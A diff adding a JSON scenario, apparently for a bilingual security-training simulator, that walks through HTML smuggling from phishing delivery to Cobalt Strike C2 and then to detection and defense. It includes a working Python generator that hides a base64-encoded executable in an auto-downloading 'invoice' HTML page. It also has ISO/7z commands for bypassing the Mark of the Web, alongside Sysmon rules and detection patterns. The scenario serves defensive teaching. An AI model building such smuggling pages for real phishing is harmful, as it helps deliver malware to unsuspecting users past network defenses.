@@ -1,0 +1,156 @@
+{
+  "id": "T1027.006",
+  "title": "HTML Smuggling 시뮬레이션",
+  "titleEn": "HTML Smuggling Simulation",
+  "duration": 8,
+  "phases": [
+    { "label": "📧 피싱 전달", "labelEn": "📧 Phishing Delivery", "steps": [0] },
+    { "label": "🔨 브라우저 조립", "labelEn": "🔨 Browser Assembly", "steps": [1] },
+    { "label": "💀 페이로드 실행", "labelEn": "💀 Payload Execution", "steps": [2] },
+    { "label": "🔍 탐지 & 방어", "labelEn": "🔍 Detection & Defense", "steps": [3, 4] }
+  ],
+  "topoNodes": [
+    { "id": "attacker", "label": "Attacker\n(Phishing)", "x": 50, "y": 80 },
+    { "id": "email", "label": "Email\nGateway", "x": 180, "y": 30 },
+    { "id": "proxy", "label": "Web\nProxy", "x": 180, "y": 130 },
+    { "id": "browser", "label": "Browser\n(JS Engine)", "x": 330, "y": 80 },
+    { "id": "disk", "label": "Local\nDisk", "x": 480, "y": 80 }
+  ],
+  "topoEdges": [
+    { "from": "attacker", "to": "email", "minStep": 0 },
+    { "from": "attacker", "to": "proxy", "minStep": 0 },
+    { "from": "email", "to": "browser", "minStep": 1 },
+    { "from": "proxy", "to": "browser", "minStep": 1 },
+    { "from": "browser", "to": "disk", "minStep": 2 }
+  ],
+  "desktopIcons": [
+    { "name": "Edge Browser", "icon": "🌐" },
+    { "name": "Email Client", "icon": "📧" },
+    { "name": "Downloads", "icon": "📁" },
+    { "name": "Process Monitor", "icon": "🔍" },
+    { "name": "Wireshark", "icon": "🦈" }
+  ],
+  "steps": [
+    {
+      "cmd": "# 공격자: HTML Smuggling 페이지 생성\npython3 -c \"\nimport base64, sys\nwith open('beacon.exe', 'rb') as f:\n    payload = base64.b64encode(f.read()).decode()\nhtml = f'''<html><head><title>Invoice #2026-0315</title></head>\n<body onload='smuggle()'>\n<h1>Loading document...</h1>\n<script>\nfunction smuggle() {{\n  var b64 = '{payload}';\n  var bin = atob(b64);\n  var arr = new Uint8Array(bin.length);\n  for(var i=0;i<bin.length;i++) arr[i]=bin.charCodeAt(i);\n  var blob = new Blob([arr],{{type:'application/octet-stream'}});\n  var a = document.createElement('a');\n  a.href = URL.createObjectURL(blob);\n  a.download = 'invoice_2026.zip';\n  a.click();\n}}\n</script></body></html>'''\nwith open('invoice.html','w') as f: f.write(html)\nprint(f'Smuggling HTML created: {len(payload)} bytes encoded')\"",
+      "out": "Smuggling HTML created: 816384 bytes encoded\n\n[분석]\n- beacon.exe (612 KB) → Base64 인코딩 (816 KB)\n- HTML 파일에 JavaScript와 함께 삽입\n- 파일 제목: 'Invoice #2026-0315' (비즈니스 문서 위장)\n- onload 이벤트로 페이지 열리면 자동 실행\n- a.download = 'invoice_2026.zip' → ZIP 파일로 위장\n- 네트워크에서는 HTML 응답만 보임",
+      "def": "[Email Gateway] HTML attachment received with large JavaScript payload — scanning...",
+      "defAction": "Tool: Python Base64 encoder\nPayload: beacon.exe (612 KB)\nEncoded Size: 816 KB (Base64)\nWrapper: HTML with onload smuggling\nDisguise: Invoice #2026-0315\nDownload Name: invoice_2026.zip\nRisk Level: High\nAction: Scan HTML attachments for atob/Blob patterns",
+      "desc": "beacon.exe를 Base64로 인코딩하여 HTML 안에 삽입합니다. 브라우저에서 열리면 JavaScript가 자동으로 바이너리를 조립하여 다운로드합니다. 네트워크 보안 장비는 정상 HTML만 볼 수 있습니다.",
+      "descEn": "beacon.exe is Base64-encoded and embedded in HTML. When opened in a browser, JavaScript automatically assembles the binary for download. Network security appliances only see normal HTML.",
+      "stepTitle": "악성 바이너리를 HTML에 Base64로 은닉",
+      "stepTitleEn": "Embed Malicious Binary as Base64 in HTML",
+      "feynman": "무기(악성파일)를 분해하여 부품을 편지(HTML) 안에 넣습니다. 세관(프록시)은 편지만 확인하고 통과시킵니다. 편지를 열면(브라우저) 자동으로 부품이 조립되어 무기가 만들어집니다.",
+      "feynmanEn": "A weapon (malware) is disassembled and parts are hidden in a letter (HTML). Customs (proxy) only checks the letter and lets it through. Opening the letter (browser) automatically assembles the weapon.",
+      "expert": "HTML Smuggling은 Blob API와 URL.createObjectURL()을 사용하여 브라우저 메모리에서 바이너리를 생성합니다. HTTPS TLS 암호화 환경에서는 프록시가 내용 검사를 할 수 없어 더욱 효과적입니다. Nobelium(SolarWinds 공격 그룹), Mespinoza, Qakbot 등이 이 기법을 실제 공격에 사용했습니다. data: URI 방식(href='data:application/octet-stream;base64,...')도 있으나 크기 제한이 있습니다.",
+      "expertEn": "HTML Smuggling uses Blob API and URL.createObjectURL() to generate binaries in browser memory. HTTPS TLS encryption makes proxy inspection ineffective. Used by Nobelium, Mespinoza, Qakbot in real attacks. data: URI method also exists but has size limitations.",
+      "defTooltip": "🔐 612KB 바이너리가 HTML 안에 Base64로 은닉됨!",
+      "defTooltipEn": "🔐 612KB binary hidden as Base64 inside HTML!",
+      "hackerLog": { "title": "smuggle_create.log", "lines": ["[10:00:00] beacon.exe 읽기 (612 KB)", "[10:00:01] Base64 인코딩 (816 KB)", "[10:00:02] HTML 래퍼 생성", "[10:00:03] invoice.html 완성"] },
+      "terms": [
+        { "term": "Blob API", "def": "JavaScript에서 바이너리 데이터를 파일 객체로 조립하는 브라우저 API" },
+        { "term": "URL.createObjectURL", "def": "메모리의 Blob 객체를 URL로 변환하여 다운로드 가능하게 만드는 API" }
+      ]
+    },
+    {
+      "cmd": "# 피해자 브라우저에서 실행되는 과정 (Edge DevTools)\n# Network 탭 캡쳐\nGET /mail/attachment/invoice.html HTTP/1.1\nHost: mail.corp.local\nContent-Type: text/html\nContent-Length: 847291\n\n# Console 출력\nconsole.log('[Smuggle] Decoding', 816384, 'bytes...');\nconsole.log('[Smuggle] Blob created:', 612288, 'bytes');\nconsole.log('[Smuggle] Download triggered: invoice_2026.zip');",
+      "out": "HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8\nX-Content-Type-Options: nosniff\n\n[Network 분석]\n- 요청: GET invoice.html (text/html)\n- 응답: 847 KB HTML (Base64 데이터 포함)\n- 프록시 로그: 정상 HTML 응답으로 분류 ✅\n- IDS/IPS: 악성 시그니처 미탐지 ✅\n\n[브라우저 처리]\n1. HTML 파싱 → onload 이벤트 트리거\n2. atob() → Base64 → 바이너리 (612 KB)\n3. Uint8Array → Blob 생성\n4. URL.createObjectURL → 임시 URL 생성\n5. a.click() → 자동 다운로드 시작\n6. 다운로드: invoice_2026.zip (실제로 PE 실행 파일)\n\n[Mark of the Web]\n- Zone.Identifier: ZoneId=3 (Internet) 태그 적용됨\n- SmartScreen 검사 트리거됨",
+      "def": "[Proxy] Large HTML response (847KB) from mail server — content appears normal but unusually large",
+      "defAction": "Tool: Browser JavaScript engine\nHTTP Response: 847 KB HTML (Content-Type: text/html)\nProxy Detection: NONE (classified as normal HTML)\nIDS Detection: NONE (no malicious signatures in HTML)\nBrowser Actions: atob → Blob → createObjectURL → auto-download\nFile Created: invoice_2026.zip (actually PE binary)\nMOTW: ZoneId=3 applied\nRisk Level: Critical\nAction: Monitor unusual HTML sizes, scan for atob/Blob patterns",
+      "desc": "브라우저가 HTML을 열면 JavaScript가 자동으로 실행됩니다. 네트워크에서는 text/html 응답만 보이므로 프록시와 IDS가 악성 파일을 탐지하지 못합니다. 브라우저에서 PE 바이너리가 조립되어 자동 다운로드됩니다.",
+      "descEn": "When the browser opens the HTML, JavaScript executes automatically. Only text/html is visible on the network, so proxy and IDS cannot detect malicious files. The PE binary is assembled in the browser and auto-downloaded.",
+      "stepTitle": "브라우저에서 바이너리 조립 및 자동 다운로드",
+      "stepTitleEn": "Browser Assembles Binary and Auto-Downloads",
+      "feynman": "편지(HTML)를 열면 마법 잉크(JavaScript)가 활성화됩니다. 부품(Base64)이 자동으로 조립되어 완성품(invoice_2026.zip)이 만들어지고, 받은편지함(Downloads 폴더)에 저장됩니다. 배달원(프록시)은 편지만 봤을 뿐, 안에서 무기가 만들어진 건 모릅니다.",
+      "feynmanEn": "Opening the letter (HTML) activates magic ink (JavaScript). Parts (Base64) auto-assemble into the finished product (invoice_2026.zip) saved to the inbox (Downloads folder). The delivery person (proxy) only saw a letter, unaware a weapon was built inside.",
+      "expert": "프록시/IDS 관점에서 HTTP 응답의 Content-Type은 text/html이고, 페이로드는 Base64 문자열(ASCII)이므로 시그니처 매칭이 불가합니다. TLS 종단 복호화(SSL Inspection)를 수행해도 HTML 내용 자체는 합법적입니다. 브라우저는 Blob URL(blob:https://...)을 생성하여 로컬 파일을 만드는데, 이때 NTFS Zone.Identifier ADS에 ZoneId=3(Internet)이 기록됩니다. SmartScreen은 이 MOTW를 확인하여 실행 전 경고를 표시합니다.",
+      "expertEn": "From proxy/IDS perspective, the Content-Type is text/html and the payload is Base64 ASCII, so signature matching fails. Even SSL Inspection sees legitimate HTML content. The browser creates a Blob URL for local file creation, and NTFS Zone.Identifier ADS records ZoneId=3 (Internet). SmartScreen checks this MOTW to warn before execution.",
+      "defTooltip": "🔐 프록시/IDS 우회! 브라우저에서 악성 파일 생성!",
+      "defTooltipEn": "🔐 Proxy/IDS bypass! Malicious file created in browser!",
+      "hackerLog": { "title": "browser_smuggle.log", "lines": ["[10:05:00] HTML 로드 → onload 트리거", "[10:05:01] Base64 디코딩 → 612 KB", "[10:05:02] Blob 생성 → createObjectURL", "[10:05:03] 자동 다운로드: invoice_2026.zip"] },
+      "terms": [
+        { "term": "Mark of the Web (MOTW)", "def": "다운로드된 파일에 인터넷 출처 정보를 태그하는 NTFS 메타데이터" },
+        { "term": "Zone.Identifier", "def": "NTFS ADS에 저장되는 파일 출처 영역 정보 (ZoneId=3은 인터넷)" }
+      ]
+    },
+    {
+      "cmd": "# 피해자가 다운로드된 파일 실행\n# SmartScreen 경고 무시 후 실행\ncd %USERPROFILE%\\Downloads\ninvoice_2026.zip\n# → 내부에 invoice.exe (beacon)\n\n# EDR 탐지 시점\nGet-WinEvent -LogName 'Microsoft-Windows-Sysmon/Operational' -MaxEvents 5 |\nWhere-Object { $_.Id -in @(1,3,11) } | Format-List TimeCreated, Id, Message",
+      "out": "TimeCreated : 2026-03-01 10:10:15\nId          : 11\nMessage     : File created: C:\\Users\\jsmith\\Downloads\\invoice_2026.zip\n              ZoneId: 3 (Internet)\n\nTimeCreated : 2026-03-01 10:10:45\nId          : 1\nMessage     : Process Create:\n              Image: C:\\Users\\jsmith\\Downloads\\invoice.exe\n              ParentImage: C:\\Windows\\explorer.exe\n              OriginalFileName: beacon.exe\n              Hashes: SHA256=a1b2c3d4...\n\nTimeCreated : 2026-03-01 10:10:47\nId          : 3\nMessage     : Network connection detected:\n              Image: invoice.exe\n              DestinationIp: 198.51.100.77\n              DestinationPort: 443\n              Protocol: TCP\n\n[공격 체인 완성]\n1. HTML Smuggling → 프록시 우회\n2. 브라우저 조립 → 로컬 파일 생성\n3. 사용자 실행 → SmartScreen 경고 무시\n4. C2 연결 → 198.51.100.77:443",
+      "def": "[EDR] Process invoice.exe (OriginalFileName: beacon.exe) established C2 connection to 198.51.100.77:443",
+      "defAction": "Tool: Sysmon Event ID 1, 3, 11\nFile: invoice_2026.zip → invoice.exe\nOriginalFileName: beacon.exe (Cobalt Strike)\nC2 Connection: 198.51.100.77:443 (TCP)\nMOTW: ZoneId=3 (Internet origin)\nParent: explorer.exe (user double-click)\nRisk Level: Critical\nAction: Kill process, block C2 IP, quarantine file, investigate email origin",
+      "desc": "사용자가 SmartScreen 경고를 무시하고 파일을 실행하면 C2 연결이 수립됩니다. Sysmon Event ID 1(프로세스 생성)과 3(네트워크 연결)으로 공격 체인을 추적합니다.",
+      "descEn": "When the user ignores SmartScreen and executes the file, a C2 connection is established. Sysmon Event IDs 1 (process creation) and 3 (network connection) trace the attack chain.",
+      "stepTitle": "페이로드 실행 및 C2 연결 수립",
+      "stepTitleEn": "Payload Execution and C2 Connection Establishment",
+      "feynman": "조립된 무기(invoice.exe)를 사용자가 직접 작동시킵니다. 보안 경비원(SmartScreen)이 '이 물건은 외부에서 온 것입니다!'라고 경고하지만, 사용자가 '괜찮아'라고 통과시키면 범인(beacon)이 본부(C2 서버)에 연락합니다.",
+      "feynmanEn": "The user activates the assembled weapon (invoice.exe). The security guard (SmartScreen) warns 'This item came from outside!' but the user says 'It's fine.' The criminal (beacon) then contacts headquarters (C2 server).",
+      "expert": "HTML Smuggling의 마지막 단계는 사회공학에 의존합니다. MOTW(ZoneId=3)가 적용되어 SmartScreen이 경고하지만, 사용자가 무시하면 실행됩니다. 공격자는 MOTW를 제거하기 위해 .iso/.vhd 파일(Windows가 마운트하면 MOTW가 전파되지 않음)이나 .7z(MOTW를 보존하지 않는 압축 프로그램)을 사용합니다. Windows 11 22H2부터 ISO 내부 파일에도 MOTW가 전파되어 이 우회가 차단되었습니다.",
+      "expertEn": "The final stage relies on social engineering. MOTW (ZoneId=3) triggers SmartScreen, but user override enables execution. Attackers use .iso/.vhd files (MOTW doesn't propagate on mount) or .7z (doesn't preserve MOTW) to remove MOTW. Windows 11 22H2+ propagates MOTW inside ISO files, blocking this bypass.",
+      "defTooltip": "🔐 beacon.exe 실행! C2 198.51.100.77:443 연결!",
+      "defTooltipEn": "🔐 beacon.exe executed! C2 connection to 198.51.100.77:443!",
+      "hackerLog": { "title": "payload_exec.log", "lines": ["[10:10:15] invoice_2026.zip 다운로드", "[10:10:45] invoice.exe 실행 (PID 5521)", "[10:10:47] C2 연결: 198.51.100.77:443", "[10:10:50] Cobalt Strike beacon 활성화"] },
+      "terms": [
+        { "term": "SmartScreen", "def": "Microsoft의 파일/URL 평판 기반 실행 차단 시스템" },
+        { "term": "Cobalt Strike Beacon", "def": "레드팀/공격자가 사용하는 C2 에이전트, 메모리 상주" }
+      ]
+    },
+    {
+      "cmd": "# HTML Smuggling 탐지 규칙 배포\n# 1. 이메일 게이트웨이: HTML 첨부파일 JS 분석\n# 2. 프록시: 비정상 HTML 크기 모니터링\n# 3. EDR: 브라우저의 파일 생성 모니터링\n\n# Sysmon 규칙 — 브라우저에서 실행 파일 생성 탐지\n<RuleGroup>\n  <FileCreate onmatch=\"include\">\n    <Image condition=\"end with\">msedge.exe</Image>\n    <Image condition=\"end with\">chrome.exe</Image>\n    <TargetFilename condition=\"end with\">.exe</TargetFilename>\n    <TargetFilename condition=\"end with\">.zip</TargetFilename>\n    <TargetFilename condition=\"end with\">.iso</TargetFilename>\n  </FileCreate>\n</RuleGroup>",
+      "out": "[Sysmon Config Updated]\n- 브라우저(Edge/Chrome) → .exe/.zip/.iso 생성 모니터링\n- Event ID 11 → SIEM 알림 연동\n\n[이메일 게이트웨이 규칙]\n- HTML 첨부파일 JavaScript 정적 분석\n- 패턴 매칭: atob(), Blob(), createObjectURL(), .download\n- 탐지 시 격리 + 관리자 알림\n\n[프록시 규칙]\n- HTML 응답 크기 > 500KB → 경고\n- text/html 응답에서 Base64 패턴 스캔\n- 의심 HTML → 샌드박스 분석 전달\n\n[브라우저 정책 (GPO)]\n- Blob URL 다운로드 제한\n- JavaScript가 생성한 다운로드 사용자 확인 필수\n- Zone 3/4 파일 자동 실행 차단",
+      "def": "[SIEM] Multi-layer HTML Smuggling detection deployed — email gateway, proxy, EDR, browser policy",
+      "defAction": "Tool: Sysmon + Email Gateway + Proxy + GPO\nSysmon: Browser → executable file creation monitoring\nEmail Gateway: HTML attachment JS analysis (atob/Blob patterns)\nProxy: HTML response > 500KB alert + Base64 scanning\nBrowser GPO: Blob URL download restriction\nZone Policy: Auto-execution blocked for Zone 3/4\nRisk Level: Mitigated\nAction: Continuous monitoring, user awareness training on HTML attachments",
+      "desc": "다중 계층 탐지를 배포합니다: 이메일 게이트웨이에서 JS 패턴 분석, 프록시에서 비정상 HTML 크기 모니터링, Sysmon으로 브라우저의 실행 파일 생성 감시, GPO로 Blob URL 다운로드를 제한합니다.",
+      "descEn": "Deploy multi-layer detection: email gateway JS pattern analysis, proxy monitoring for abnormal HTML sizes, Sysmon watching browser executable creation, and GPO restricting Blob URL downloads.",
+      "stepTitle": "다중 계층 HTML Smuggling 탐지 체계 배포",
+      "stepTitleEn": "Deploy Multi-Layer HTML Smuggling Detection System",
+      "feynman": "세관(프록시)에 '편지가 비정상적으로 무거우면 검사'하라는 규칙을 추가합니다. 우체국(이메일 게이트웨이)에서는 '마법 잉크(JavaScript) 패턴'을 검사합니다. 집 안(EDR)에서는 '브라우저에서 무기가 만들어지면 즉시 신고'합니다.",
+      "feynmanEn": "Add rules to customs (proxy): 'inspect unusually heavy letters.' The post office (email gateway) checks for 'magic ink (JavaScript) patterns.' Inside the house (EDR): 'report immediately if weapons are made from the browser.'",
+      "expert": "HTML Smuggling 탐지의 핵심은 네트워크가 아닌 엔드포인트에 있습니다. Sysmon Event ID 11의 FileCreate에서 Image가 브라우저 프로세스이고 TargetFilename이 실행 파일(.exe, .dll, .scr)인 경우를 모니터링합니다. 이메일 게이트웨이는 HTML 첨부파일에서 atob(), String.fromCharCode(), Blob, ArrayBuffer 패턴을 정적 분석합니다. 최신 방어로는 WDAC의 ISG(Intelligent Security Graph) 통합이 있습니다.",
+      "expertEn": "Key to HTML Smuggling detection is the endpoint, not the network. Monitor Sysmon Event ID 11 FileCreate where Image is a browser process and TargetFilename is an executable. Email gateways statically analyze HTML attachments for atob(), String.fromCharCode(), Blob, ArrayBuffer patterns. Latest defense includes WDAC ISG integration.",
+      "defTooltip": "🔐 다중 계층 탐지! 이메일+프록시+EDR+GPO!",
+      "defTooltipEn": "🔐 Multi-layer detection! Email+Proxy+EDR+GPO!",
+      "hackerLog": { "title": "defense_deploy.log", "lines": ["[10:20:00] Sysmon 브라우저 파일 생성 규칙 적용", "[10:20:02] 이메일 게이트웨이 JS 분석 활성화", "[10:20:04] 프록시 HTML 크기 모니터링 시작", "[10:20:06] GPO Blob 다운로드 제한 배포"] },
+      "terms": [
+        { "term": "ISG", "def": "Intelligent Security Graph, Microsoft의 파일 평판 클라우드 서비스" },
+        { "term": "정적 분석", "def": "코드를 실행하지 않고 패턴과 구조를 분석하는 기법" }
+      ]
+    },
+    {
+      "cmd": "# MOTW 우회 기법 분석 및 추가 방어\n# 공격자들의 MOTW 제거 시도\n\n# 1. ISO/VHD 컨테이너 기법\nmkisofs -o smuggled.iso invoice.exe\n# → ISO 마운트 시 내부 파일에 MOTW 미전파 (구버전 Windows)\n\n# 2. 7-Zip MOTW 미보존\n# 7z a smuggled.7z invoice.exe → MOTW 제거됨 (구버전)\n\n# 방어: Windows 11 22H2+ MOTW 전파 확인\nGet-Item -Path .\\invoice.exe -Stream Zone.Identifier 2>$null",
+      "out": "[MOTW 우회 기법 분석]\n\n1. ISO/VHD 컨테이너 (CVE-2022-41091)\n   - Windows 10/11 구버전: ISO 내부 파일 MOTW 미전파\n   - 패치 후 (2022-11): ISO 내부에도 MOTW 전파\n   - 현재: 우회 불가 (패치 적용 환경)\n\n2. 7-Zip MOTW (CVE-2025-0411)\n   - 7-Zip 24.01 이전: MOTW 미보존\n   - 7-Zip 24.02+: MOTW 보존 지원\n   - 현재: 최신 버전에서 우회 불가\n\n3. CAB/LNK 체인\n   - .cab 파일에서 추출 시 MOTW 미전파 가능\n   - LNK 파일을 통한 간접 실행\n\n[최종 방어 체계]\n- Windows 최신 패치 적용 (MOTW 전파 강화)\n- 7-Zip 최신 버전 유지\n- WDAC + SmartScreen 조합\n- ASR(Attack Surface Reduction) 규칙 활성화\n- 사용자 보안 인식 교육",
+      "def": "[SIEM] MOTW bypass analysis complete — all known bypasses patched in current environment",
+      "defAction": "Tool: MOTW Analysis + Patching\nISO Bypass: CVE-2022-41091 (patched Nov 2022)\n7-Zip Bypass: CVE-2025-0411 (patched 7-Zip 24.02)\nRemaining Vector: CAB/LNK chain (monitor)\nDefense Layers:\n  1. MOTW propagation (latest patches)\n  2. SmartScreen + WDAC\n  3. ASR rules (Block Office/Adobe child processes)\n  4. User awareness training\nRisk Level: Low (with full patching)\nAction: Maintain patch levels, monitor for new MOTW bypass CVEs",
+      "desc": "공격자들의 MOTW 우회 기법(ISO, 7-Zip)을 분석하고, 최신 패치로 이를 차단합니다. ASR 규칙과 WDAC을 조합하여 HTML Smuggling의 전체 공격 체인을 방어합니다.",
+      "descEn": "Analyze attacker MOTW bypass techniques (ISO, 7-Zip) and block them with latest patches. Combine ASR rules with WDAC to defend against the full HTML Smuggling attack chain.",
+      "stepTitle": "MOTW 우회 차단 및 전체 방어 체계 완성",
+      "stepTitleEn": "Block MOTW Bypasses and Complete Defense System",
+      "feynman": "범인이 MOTW 태그를 떼어내려고 특수 포장(ISO, 7-Zip)을 사용합니다. 하지만 최신 보안 업데이트로 이런 포장을 열어도 태그가 유지됩니다. 마지막 방어선은 직원 교육입니다: '모르는 편지(HTML)의 선물(다운로드)은 열지 마세요!'",
+      "feynmanEn": "Criminals try removing MOTW tags using special packaging (ISO, 7-Zip). Latest security updates ensure tags persist even when these packages are opened. The last defense line is employee training: 'Don't open gifts (downloads) from unknown letters (HTML)!'",
+      "expert": "CVE-2022-41091(ISO MOTW bypass)은 2022년 11월 패치로 해결되었고, CVE-2025-0411(7-Zip MOTW)은 24.02 버전에서 수정되었습니다. 남은 공격 벡터로 CAB 파일 추출(CVE-2022-41049)이 있으나 역시 패치되었습니다. ASR(Attack Surface Reduction) 규칙 중 'Block all Office applications from creating child processes', 'Block executable content from email client and webmail'이 HTML Smuggling 후 실행 단계를 차단합니다. WDAC의 Application Control 정책으로 unsigned/untrusted 바이너리 실행을 커널 레벨에서 차단하는 것이 가장 강력한 방어입니다.",
+      "expertEn": "CVE-2022-41091 (ISO MOTW bypass) was patched November 2022. CVE-2025-0411 (7-Zip MOTW) was fixed in version 24.02. ASR rules 'Block Office from creating child processes' and 'Block executable content from email' prevent post-smuggling execution. WDAC Application Control is the strongest defense, blocking unsigned binaries at kernel level.",
+      "defTooltip": "🔐 MOTW 우회 차단! ASR+WDAC 방어 체계 완성!",
+      "defTooltipEn": "🔐 MOTW bypasses blocked! ASR+WDAC defense system complete!",
+      "hackerLog": { "title": "motw_defense.log", "lines": ["[10:30:00] ISO MOTW 우회: 패치 적용 확인", "[10:30:02] 7-Zip 24.02+: MOTW 보존 확인", "[10:30:04] ASR 규칙 활성화", "[10:30:06] WDAC 정책 배포 완료"] },
+      "terms": [
+        { "term": "ASR", "def": "Attack Surface Reduction, 공격 표면 축소 규칙 (Microsoft Defender)" },
+        { "term": "WDAC", "def": "Windows Defender Application Control, 커널 레벨 애플리케이션 제어" }
+      ]
+    }
+  ],
+  "processTree": {
+    "name": "msedge.exe",
+    "pid": 3200,
+    "children": [
+      {
+        "name": "msedge.exe (renderer)",
+        "pid": 3215,
+        "children": []
+      },
+      {
+        "name": "msedge.exe (gpu)",
+        "pid": 3220,
+        "children": []
+      }
+    ]
+  }
+}
